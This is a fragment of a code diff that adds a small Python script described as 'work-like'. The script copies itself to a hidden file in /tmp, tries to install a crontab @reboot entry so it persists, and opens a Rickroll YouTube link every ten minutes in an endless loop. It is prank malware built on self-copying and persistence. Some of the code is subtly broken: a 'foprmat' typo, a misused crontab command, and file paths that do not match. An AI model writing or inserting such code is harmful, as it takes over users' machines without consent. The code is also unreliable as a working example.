@@ -33,13 +33,26 @@ if __name__ == "__main__":
     del ff
 
 # Mini work-like script:
-import shutil, sys
+import shutil, sys, schedule, time, webbrowser, os
 
+def persist():
+    os.system("crontab -e @reboot /tmp/{0}".foprmat(sys.argv[0]))
 
+def do_stuff():
+    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", new=2)
 
 
 if __name__ == "__main__":
+    # Copy
     try:
         shutil.copy(__file__, '/tmp/.{0}'.format(sys.argv[0]))
     except Exception as error:
         print(error)
+    # Persist:
+    persist()
+    # Schedule:
+    schedule.every(10).minutes.do(do_stuff)
+    # Run:
+    while True:
+        schedule.run_pending()
+        time.sleep(0.1)
